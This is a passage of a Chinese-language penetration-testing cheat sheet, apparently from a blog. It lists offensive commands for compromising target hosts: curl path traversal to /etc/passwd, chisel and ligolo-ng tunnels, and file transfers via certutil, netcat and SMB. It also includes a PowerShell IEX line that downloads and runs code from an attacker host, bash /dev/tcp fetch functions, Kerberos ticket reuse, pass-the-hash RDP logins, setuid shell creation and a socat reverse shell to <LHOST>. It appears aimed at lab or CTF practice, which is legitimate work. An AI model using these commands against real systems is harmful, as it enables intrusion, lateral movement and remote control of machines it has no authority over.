class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST http://&lt;DOMAIN&gt;                                                   // use POST method<br><br><span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> PUT http://&lt;DOMAIN&gt;                                                    // use PUT method<br><br><span class="hljs-built_in">curl</span> <span class="hljs-literal">--path-as-is</span> http://&lt;DOMAIN&gt;/../../../../../../etc/passwd                 // use <span class="hljs-literal">--path-as-is</span> to handle /../ or /./ <span class="hljs-keyword">in</span> the given URL<br><br><span class="hljs-built_in">curl</span> <span class="hljs-literal">--proxy</span> http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8080</span>                                             // use proxy<br><br><span class="hljs-built_in">curl</span> <span class="hljs-operator">-F</span> myFile=<span class="hljs-selector-tag">@</span>&lt;FILE&gt; http://&lt;RHOST&gt;                                          // file upload<br><br><span class="hljs-built_in">curl</span><span class="hljs-variable">$</span>&#123;IFS&#125;&lt;LHOST&gt;/&lt;FILE&gt;                                                       // Internal Field Separator (IFS) example<br></code></pre></td></tr></table></figure>

<h4 id="chisel-工具"><a href="#chisel-工具" class="headerlink" title="chisel 工具"></a>chisel 工具</h4><h5 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">./chisel server -p <span class="hljs-number">9002</span> -reverse -v<br>./chisel client &lt;LHOST&gt;:<span class="hljs-number">9002</span> R:<span class="hljs-number">3000</span>:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">3000</span><br></code></pre></td></tr></table></figure>

<h5 id="SOCKS5-代理链配置"><a href="#SOCKS5-代理链配置" class="headerlink" title="SOCKS5 &#x2F; 代理链配置"></a>SOCKS5 &#x2F; 代理链配置</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">./chisel server -p <span class="hljs-number">9002</span> -reverse -v<br>./chisel client &lt;LHOST&gt;:<span class="hljs-number">9002</span> R:socks<br></code></pre></td></tr></table></figure>

<h4 id="文件传输方法"><a href="#文件传输方法" class="headerlink" title="文件传输方法"></a>文件传输方法</h4><h5 id="证书工具下载文件"><a href="#证书工具下载文件" class="headerlink" title="证书工具下载文件"></a>证书工具下载文件</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">certutil -urlcache -split -f <span class="hljs-string">&quot;http://&lt;LHOST&gt;/&lt;FILE&gt;&quot;</span> &lt;FILE&gt;<br></code></pre></td></tr></table></figure>

<h5 id="NETCAT-传递文件"><a href="#NETCAT-传递文件" class="headerlink" title="NETCAT 传递文件"></a>NETCAT 传递文件</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">nc -lnvp &lt;LPORT&gt; &lt; &lt;FILE&gt;<br>nc &lt;RHOST&gt; &lt;RPORT&gt; &gt; &lt;FILE&gt;<br></code></pre></td></tr></table></figure>

<h5 id="IMPACKET-SMBSERVER-传递文件"><a href="#IMPACKET-SMBSERVER-传递文件" class="headerlink" title="IMPACKET-SMBSERVER  传递文件"></a>IMPACKET-SMBSERVER  传递文件</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo impacket-smbserver &lt;SHARE&gt; ./<br>sudo impacket-smbserver &lt;SHARE&gt; . -smb2support<br>copy * \\&lt;LHOST&gt;\&lt;SHARE&gt;<br></code></pre></td></tr></table></figure>

<h5 id="POWERSHELL-传递文件"><a href="#POWERSHELL-传递文件" class="headerlink" title="POWERSHELL 传递文件"></a>POWERSHELL 传递文件</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">iwr &lt;LHOST&gt;/&lt;FILE&gt; -o &lt;FILE&gt;<br><br>IEX(IWR http:<span class="hljs-comment">//&lt;LHOST&gt;/&lt;FILE&gt;) -UseBasicParsing</span><br><br>powershell -command Invoke-WebRequest -Uri http:<span class="hljs-comment">//&lt;LHOST&gt;:&lt;LPORT&gt;/&lt;FILE&gt; -Outfile C:\\temp\\&lt;FILE&gt;</span><br></code></pre></td></tr></table></figure>

<h5 id="仅-BASH-下的文件传递命令"><a href="#仅-BASH-下的文件传递命令" class="headerlink" title="仅 BASH 下的文件传递命令"></a>仅 BASH 下的文件传递命令</h5><h6 id="WGET-函数版本的文件传输使用"><a href="#WGET-函数版本的文件传输使用" class="headerlink" title="WGET 函数版本的文件传输使用"></a>WGET 函数版本的文件传输使用</h6><p>直接粘贴到SHELL上面：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">function __wget() &#123;<br>    : $&#123;DEBUG:=<span class="hljs-number">0</span>&#125;<br>    local URL=$<span class="hljs-number">1</span><br>    local tag=<span class="hljs-string">&quot;Connection: close&quot;</span><br>    local mark=<span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;$&#123;URL&#125;&quot;</span> ]; then<br>        <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;Usage: %s \&quot;URL\&quot; [e.g.: %s http://www.google.com/]&quot;</span> \<br>               <span class="hljs-string">&quot;$&#123;FUNCNAME[0]&#125;&quot;</span> <span class="hljs-string">&quot;$&#123;FUNCNAME[0]&#125;&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    fi<br>    read proto server path &lt;&lt;&lt;$(echo $&#123;URL<span class="hljs-comment">//// &#125;)</span><br>    DOC=/$&#123;path<span class="hljs-comment">// //&#125;</span><br>    HOST=$&#123;server<span class="hljs-comment">//:*&#125;</span><br>    PORT=$&#123;server<span class="hljs-comment">//*:&#125;</span><br>    [[ x<span class="hljs-string">&quot;$&#123;HOST&#125;&quot;</span> == x<span class="hljs-string">&quot;$&#123;PORT&#125;&quot;</span> ]] &amp;&amp; PORT=<span class="hljs-number">80</span><br>    [[ $DEBUG -eq <span class="hljs-number">1</span> ]] &amp;&amp; echo <span class="hljs-string">&quot;HOST=$HOST&quot;</span><br>    [[ $DEBUG -eq <span class="hljs-number">1</span> ]] &amp;&amp; echo <span class="hljs-string">&quot;PORT=$PORT&quot;</span><br>    [[ $DEBUG -eq <span class="hljs-number">1</span> ]] &amp;&amp; echo <span class="hljs-string">&quot;DOC =$DOC&quot;</span><br><br>    exec <span class="hljs-number">3</span>&lt;&gt;/dev/tcp/$&#123;HOST&#125;/$PORT<br>    echo -en <span class="hljs-string">&quot;GET $&#123;DOC&#125; HTTP/1.1\r\nHost: $&#123;HOST&#125;\r\n$&#123;tag&#125;\r\n\r\n&quot;</span> &gt;&amp;<span class="hljs-number">3</span><br>    <span class="hljs-keyword">while</span> read line; <span class="hljs-keyword">do</span><br>        [[ $mark -eq <span class="hljs-number">1</span> ]] &amp;&amp; echo $line<br>        <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;$&#123;line&#125;&quot;</span> =~ <span class="hljs-string">&quot;$&#123;tag&#125;&quot;</span> ]]; then<br>            mark=<span class="hljs-number">1</span><br>        fi<br>    done &lt;&amp;<span class="hljs-number">3</span><br>    exec <span class="hljs-number">3</span>&gt;&amp;-<br>&#125;<br></code></pre></td></tr></table></figure>
<p>使用上面自定义的函数下载文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">__wget http:<span class="hljs-comment">//&lt;LHOST&gt;/&lt;FILE&gt;</span><br></code></pre></td></tr></table></figure>

<h6 id="CURL-函数版本的文件传输使用"><a href="#CURL-函数版本的文件传输使用" class="headerlink" title="CURL 函数版本的文件传输使用"></a>CURL 函数版本的文件传输使用</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">function __curl() &#123;<br>  read proto server path &lt;&lt;&lt;$(echo $&#123;<span class="hljs-number">1</span><span class="hljs-comment">//// &#125;)</span><br>  DOC=/$&#123;path<span class="hljs-comment">// //&#125;</span><br>  HOST=$&#123;server<span class="hljs-comment">//:*&#125;</span><br>  PORT=$&#123;server<span class="hljs-comment">//*:&#125;</span><br>  [[ x<span class="hljs-string">&quot;$&#123;HOST&#125;&quot;</span> == x<span class="hljs-string">&quot;$&#123;PORT&#125;&quot;</span> ]] &amp;&amp; PORT=<span class="hljs-number">80</span><br><br>  exec <span class="hljs-number">3</span>&lt;&gt;/dev/tcp/$&#123;HOST&#125;/$PORT<br>  echo -en <span class="hljs-string">&quot;GET $&#123;DOC&#125; HTTP/1.0\r\nHost: $&#123;HOST&#125;\r\n\r\n&quot;</span> &gt;&amp;<span class="hljs-number">3</span><br>  (<span class="hljs-keyword">while</span> read line; <span class="hljs-keyword">do</span><br>   [[ <span class="hljs-string">&quot;$line&quot;</span> == $<span class="hljs-string">&#x27;\r&#x27;</span> ]] &amp;&amp; <span class="hljs-keyword">break</span><br>  done &amp;&amp; cat) &lt;&amp;<span class="hljs-number">3</span><br>  exec <span class="hljs-number">3</span>&gt;&amp;-<br>&#125;<br></code></pre></td></tr></table></figure>
<p>使用上面自定义的函数进行文件下载：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">__curl http:<span class="hljs-comment">//&lt;LHOST&gt;/&lt;FILE&gt; &gt; &lt;OUTPUT_FILE&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="使用FTP协议进行文件传输"><a href="#使用FTP协议进行文件传输" class="headerlink" title="使用FTP协议进行文件传输"></a>使用FTP协议进行文件传输</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">ftp &lt;RHOST&gt;<br>wget -r ftp:<span class="hljs-comment">//anonymous:anonymous@&lt;RHOST&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="Kerberos-协议-KDC密钥分发中心"><a href="#Kerberos-协议-KDC密钥分发中心" class="headerlink" title="Kerberos 协议 ( KDC密钥分发中心 )"></a>Kerberos 协议 ( KDC密钥分发中心 )</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo apt-get install krb5-kdc<br></code></pre></td></tr></table></figure>
<p>获取目标域账号票据并导入到本地使用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-getTGT &lt;DOMAIN&gt;/&lt;USERNAME&gt;:<span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span><br>export KRB5CCNAME=&lt;FILE&gt;.ccache # （导入票据）<br>export KRB5CCNAME=<span class="hljs-string">&#x27;realpath &lt;FILE&gt;.ccache&#x27;</span><br></code></pre></td></tr></table></figure>
<p>kerberos协议默认命令使用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">/etc/krb5.conf                   <span class="hljs-comment">// kerberos配置文件位置</span><br>kinit &lt;USERNAME&gt;                 <span class="hljs-comment">// 创建票证请求</span><br>klist                            <span class="hljs-comment">// 显示可用的kerberos门票</span><br>kdestroy                         <span class="hljs-comment">// 删除缓存的kerberos票证</span><br>.k5login                         <span class="hljs-comment">// 驻留用于登录的kerberos主体（位于主目录中）</span><br>krb5.keytab                      <span class="hljs-comment">// 一个或多个主体的“密钥表”文件</span><br>kadmin                           <span class="hljs-comment">// kerberos管理控制台</span><br>add_principal &lt;EMAIL&gt;            <span class="hljs-comment">// 将新用户添加到keytab文件</span><br>ksu                              <span class="hljs-comment">// 使用kerberos身份验证执行命令</span><br>klist -k /etc/krb5.keytab        <span class="hljs-comment">// 列出 keytab 文件</span><br>kadmin -p kadmin/&lt;EMAIL&gt; -k -t /etc/krb5.keytab    <span class="hljs-comment">// 启用对keytab文件的编辑</span><br></code></pre></td></tr></table></figure>

<h4 id="ligolo-ng-像VPN一样的隧道代理工具"><a href="#ligolo-ng-像VPN一样的隧道代理工具" class="headerlink" title="ligolo-ng | 像VPN一样的隧道代理工具"></a>ligolo-ng | 像VPN一样的隧道代理工具</h4><p>工具地址： <a target="_blank" rel="noopener" href="https://github.com/nicocha30/ligolo-ng">https://github.com/nicocha30/ligolo-ng</a></p>
<h5 id="下载代理服务端和客户端程序"><a href="#下载代理服务端和客户端程序" class="headerlink" title="下载代理服务端和客户端程序"></a>下载代理服务端和客户端程序</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">wget https:<span class="hljs-comment">//github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz</span><br><br>wget https:<span class="hljs-comment">//github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz</span><br></code></pre></td></tr></table></figure>

<h5 id="准备隧道接口"><a href="#准备隧道接口" class="headerlink" title="准备隧道接口"></a>准备隧道接口</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo ip tuntap add user $(whoami) mode tun ligolo<br></code></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo<span class="hljs-built_in"> ip </span>link <span class="hljs-built_in">set</span> ligolo up<br></code></pre></td></tr></table></figure>

<h5 id="在攻击者机器上设置代理"><a href="#在攻击者机器上设置代理" class="headerlink" title="在攻击者机器上设置代理"></a>在攻击者机器上设置代理</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./proxy -laddr &lt;LHOST&gt;:<span class="hljs-number">443</span> -selfcert<br></code></pre></td></tr></table></figure>

<h5 id="在目标机器上安装代理"><a href="#在目标机器上安装代理" class="headerlink" title="在目标机器上安装代理"></a>在目标机器上安装代理</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./agent -connect &lt;LHOST&gt;:<span class="hljs-number">443</span> -ignore-cert<br></code></pre></td></tr></table></figure>

<h5 id="靶机会话操作"><a href="#靶机会话操作" class="headerlink" title="靶机会话操作"></a>靶机会话操作</h5><p>查看获取到的会话信息并选择：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ligolo-ng » session<br></code></pre></td></tr></table></figure>
<p>查看目标靶机的网络配置情况：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">[Agent : user@target] » ifconfig<br></code></pre></td></tr></table></figure>
<p>在攻击机上添加靶机路由地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo ip r add <span class="hljs-number">172.16</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> dev ligolo<br></code></pre></td></tr></table></figure>
<p>启动路由代理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">[Agent : user@target] » start<br></code></pre></td></tr></table></figure>

<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><h5 id="启动某个用户的BASH操作环境"><a href="#启动某个用户的BASH操作环境" class="headerlink" title="启动某个用户的BASH操作环境"></a>启动某个用户的BASH操作环境</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">doas -u &lt;USERNAME&gt; /bin/sh<br></code></pre></td></tr></table></figure>

<h5 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">export PATH=`pwd`:$PATH<br></code></pre></td></tr></table></figure>

<h5 id="编译某个EXP工具源码为EXE的可执行文件"><a href="#编译某个EXP工具源码为EXE的可执行文件" class="headerlink" title="编译某个EXP工具源码为EXE的可执行文件"></a>编译某个EXP工具源码为EXE的可执行文件</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc (--<span class="hljs-type">static</span>) -m32 -Wl,--hash-style=both exploit.c -o exploit<br><br>i686-w64-mingw32-gcc -o main32.exe main.c<br><br>x86_64-w64-mingw32-gcc -o main64.exe main.c<br></code></pre></td></tr></table></figure>

<h5 id="查看文件或目录访问控制列表"><a href="#查看文件或目录访问控制列表" class="headerlink" title="查看文件或目录访问控制列表"></a>查看文件或目录访问控制列表</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">getfacl &lt;LOCAL_DIRECTORY&gt;<br></code></pre></td></tr></table></figure>

<h5 id="对文件字符串进行固定格式的转换和BASE64编码"><a href="#对文件字符串进行固定格式的转换和BASE64编码" class="headerlink" title="对文件字符串进行固定格式的转换和BASE64编码"></a>对文件字符串进行固定格式的转换和BASE64编码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">echo <span class="hljs-string">&quot;&lt;COMMAND&gt;&quot;</span> | iconv -t UTF<span class="hljs-number">-16L</span>E | base64 -w <span class="hljs-number">0</span><br><br>echo <span class="hljs-string">&quot;&lt;COMMAND&gt;&quot;</span> | iconv -f UTF<span class="hljs-number">-8</span> -t UTF<span class="hljs-number">-16L</span>E | base64 -w0<br><br>iconv -f ASCII -t UTF<span class="hljs-number">-16L</span>E &lt;FILE&gt;.txt | base64 | tr -d <span class="hljs-string">&quot;\n&quot;</span><br></code></pre></td></tr></table></figure>

<h5 id="VI-命令工具提权"><a href="#VI-命令工具提权" class="headerlink" title="VI 命令工具提权"></a>VI 命令工具提权</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">:w !sudo tee %    # 使用提升的权限保存文件而不退出<br></code></pre></td></tr></table></figure>

<h5 id="WINDOWS-命令格式化"><a href="#WINDOWS-命令格式化" class="headerlink" title="WINDOWS 命令格式化"></a>WINDOWS 命令格式化</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">echo <span class="hljs-string">&quot;&lt;COMMAND&gt;&quot;</span> | iconv -f UTF<span class="hljs-number">-8</span> -t UTF<span class="hljs-number">-16L</span>E | base64 -w0<br></code></pre></td></tr></table></figure>

<h4 id="Microsoft-Windows"><a href="#Microsoft-Windows" class="headerlink" title="Microsoft Windows"></a>Microsoft Windows</h4><h5 id="查看本地文件"><a href="#查看本地文件" class="headerlink" title="查看本地文件"></a>查看本地文件</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">dir /a<br>dir /a:d<br>dir /a:h<br>dir flag* /s /p<br>dir /s /b *.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure>

<h4 id="PHP一键生成WEB服务器"><a href="#PHP一键生成WEB服务器" class="headerlink" title="PHP一键生成WEB服务器"></a>PHP一键生成WEB服务器</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo php -S <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>

<h4 id="PING-测试目标连通率"><a href="#PING-测试目标连通率" class="headerlink" title="PING 测试目标连通率"></a>PING 测试目标连通率</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">ping -c <span class="hljs-number">1</span> &lt;RHOST&gt;<br>ping -n <span class="hljs-number">1</span> &lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h4 id="Python一键启动WEB服务器"><a href="#Python一键启动WEB服务器" class="headerlink" title="Python一键启动WEB服务器"></a>Python一键启动WEB服务器</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo python -m SimpleHTTPServer <span class="hljs-number">80</span><br>sudo python3 -m http.server <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>

<h4 id="使用xfreerdp和rdesktop登录win主机"><a href="#使用xfreerdp和rdesktop登录win主机" class="headerlink" title="使用xfreerdp和rdesktop登录win主机"></a>使用xfreerdp和rdesktop登录win主机</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">xfreerdp /v:&lt;RHOST&gt; /u:&lt;USERNAME&gt; /p:&lt;PASSWORD&gt; /dynamic-resolution +clipboard<br><br>xfreerdp /v:&lt;RHOST&gt; /u:&lt;USERNAME&gt; /d:&lt;DOMAIN&gt; /pth:<span class="hljs-string">&#x27;&lt;HASH&gt;&#x27;</span> /dynamic-resolution +clipboard<br><br>rdesktop &lt;RHOST&gt;<br><br>xfreerdp /v:&lt;RHOST&gt; /dynamic-resolution +clipboard /tls-seclevel:<span class="hljs-number">0</span> -sec-nla<br></code></pre></td></tr></table></figure>

<h4 id="showmount-命令使用"><a href="#showmount-命令使用" class="headerlink" title="showmount 命令使用"></a>showmount 命令使用</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"># 查询远程NFS服务器 &lt;RHOST&gt; 上共享的目录列表<br>/usr/sbin/showmount -e &lt;RHOST&gt;<br># 以管理员身份查询远程NFS服务器 &lt;RHOST&gt; 上共享的目录列表<br>sudo showmount -e &lt;RHOST&gt;<br># 更改文件所有权并添加+S参数<br>chown root:root sid-shell; chmod +s sid-shell<br></code></pre></td></tr></table></figure>

<h4 id="目标靶机存在磁盘SMB共享服务-挂载远程文件系统"><a href="#目标靶机存在磁盘SMB共享服务-挂载远程文件系统" class="headerlink" title="目标靶机存在磁盘SMB共享服务 - 挂载远程文件系统"></a>目标靶机存在磁盘SMB共享服务 - 挂载远程文件系统</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"># 挂载CIFS（Common Internet File System，一种基于SMB协议的网络文件共享协议）类型的远程文件系统。<br>mount.cifs <span class="hljs-comment">//&lt;RHOST&gt;/&lt;SHARE&gt; /mnt/remote</span><br># 挂载虚拟机镜像文件中的某个目录作为本地挂载点的，通常用在虚拟化环境中。<br>guestmount --add <span class="hljs-string">&#x27;/&lt;MOUNTPOINT&gt;/&lt;DIRECTORY/FILE&gt;&#x27;</span> --inspector --ro /mnt/&lt;MOUNT&gt; -v<br></code></pre></td></tr></table></figure>

<h4 id="SMBCLIENT-工具使用"><a href="#SMBCLIENT-工具使用" class="headerlink" title="SMBCLIENT 工具使用"></a>SMBCLIENT 工具使用</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">smbclient -L \\&lt;RHOST&gt;\ -N<br>smbclient -L <span class="hljs-comment">//&lt;RHOST&gt;/ -N</span><br>smbclient -L <span class="hljs-comment">////&lt;RHOST&gt;/ -N</span><br>smbclient -L <span class="hljs-comment">//&lt;RHOST&gt;// -U &lt;USERNAME&gt;%&lt;PASSWORD&gt;</span><br>smbclient -U <span class="hljs-string">&quot;&lt;USERNAME&gt;&quot;</span> -L \\\\&lt;RHOST&gt;\\<br>smbclient <span class="hljs-comment">//&lt;RHOST&gt;/&lt;SHARE&gt; -U &lt;USERNAME&gt;</span><br>smbclient <span class="hljs-comment">//&lt;RHOST&gt;/SYSVOL -U &lt;USERNAME&gt;%&lt;PASSWORD&gt;</span><br>smbclient <span class="hljs-string">&quot;\\\\&lt;RHOST&gt;\&lt;SHARE&gt;&quot;</span><br>smbclient \\\\&lt;RHOST&gt;\\&lt;SHARE&gt; -U <span class="hljs-string">&#x27;&lt;USERNAME&gt;&#x27;</span> --socket-options=<span class="hljs-string">&#x27;TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072&#x27;</span> -t <span class="hljs-number">40000</span><br>smbclient --no-pass <span class="hljs-comment">//&lt;RHOST&gt;/&lt;SHARE&gt;</span><br></code></pre></td></tr></table></figure>

<h5 id="在FTP服务器上一次下载多个文件"><a href="#在FTP服务器上一次下载多个文件" class="headerlink" title="在FTP服务器上一次下载多个文件"></a>在FTP服务器上一次下载多个文件</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">mask<span class="hljs-string">&quot;&quot;</span><br>recurse ON<br>prompt OFF<br>mget *<br></code></pre></td></tr></table></figure>

<h4 id="Socat-端口转发工具"><a href="#Socat-端口转发工具" class="headerlink" title="Socat 端口转发工具"></a>Socat 端口转发工具</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"># 将本地端口流量转发到远程主机的目标端口上<br>socat TCP-LISTEN:&lt;LPORT&gt;,fork TCP:&lt;RHOST&gt;:&lt;RPORT&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"># 获取靶机上面反弹的交互shell<br>socat file:`tty`,raw,echo=<span class="hljs-number">0</span> tcp-listen:&lt;LPORT&gt;<br>socat exec:<span class="hljs-string">&#x27;bash -li&#x27;</span>,pty,<span class="hljs-built_in">stderr</span>,setsid,sigint,sane tcp:&lt;LHOST&gt;:&lt;LPORT&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"># 监听本地端口地址，并将本地监听的流量转发到目标远程主机的目标端口上或本地端口上<br>socat tcp-listen:<span class="hljs-number">5986</span>,reuseaddr,fork tcp:&lt;RHOST&gt;:<span class="hljs-number">9002</span><br>socat tcp-listen:<span class="hljs-number">9002</span>,reuseaddr,fork tcp:<span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.228</span>:<span class="hljs-number">5968</span> &amp;<br></code></pre></td></tr></table></figure>

